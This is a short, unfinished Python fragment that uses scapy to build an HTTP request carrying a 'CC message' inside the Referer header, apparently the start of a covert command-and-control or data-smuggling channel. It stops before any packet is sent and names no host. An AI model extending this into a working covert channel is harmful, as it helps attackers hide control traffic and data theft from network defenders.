from scapy.all import *
from scapy.layers.http import HTTP, HTTPRequest


def send_CC_message(message):

    if len(message.encode('utf-8')) <= 1024:
        packet = HTTP()/HTTPRequest(
        referer = message
        )
